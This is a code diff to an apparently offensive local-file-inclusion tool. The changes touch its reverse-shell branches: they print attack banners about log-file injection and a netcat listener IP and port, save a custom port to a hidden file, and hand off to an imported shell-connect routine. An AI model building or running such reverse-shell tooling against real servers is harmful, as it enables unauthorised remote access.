@@ -256,11 +256,21 @@ class Local_File_In:
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
-                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    if self.args.port: 
+                                        with open("./Package/shell/.port",'w') as port:
+                                            port.write(self.args.port)
+                                
+                                    print("[+] Mothead              : ................ | : injecting log file  ")
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
-                                    print("[+] Lisliner Port        : ................ | : 7777") 
-                                    Reverse_shell(self,**kwargs)
+                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
+                                    if not self.args.port:
+                                        if os.path.exists("./Package/shell/.port"):
+                                            os.remove("./Package/shell/.port")
+                                        print("[+] Lisliner Port        : ................ | : 7777") 
+                                    else:
+                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
+                                    from Package.LFT_Shell_connect import Shell_conncet
+                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                     exit()
                                 else:
                                       print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
@@ -295,11 +305,20 @@ class Local_File_In:
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
-                                    print("[+] Mothead              : ................ | : enjaction log file  ")
+                                    if self.args.port: 
+                                        with open("./Package/shell/.port",'w') as port:
+                                            port.write(self.args.port)
+                                    print("[+] Mothead              : ................ | : injecting log file  ")
                                     print("[+] Lisliner Tool        : ................ | : NETCAT ")
-                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
-                                    print("[+] Lisliner Port        : ................ | : 7777") 
-                                    self.Reverse_shell()
+                                    print("[+] Lisliner IP          : ................ | :",self.args.shell)   
+                                    if not self.args.port:
+                                        if os.path.exists("./Package/shell/.port"):
+                                            os.remove("./Package/shell/.port")
+                                        print("[+] Lisliner Port        : ................ | : 7777") 
+                                    else:
+                                       print("[+] Lisliner Port        : ................ | : " + self.args.port)   
+                                    from Package.LFT_Shell_connect import Shell_conncet
+                                    Shell_conncet.Connect_SSh_Shell(self,args = self.control)
                                     exit()
                                 else:
                                       print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
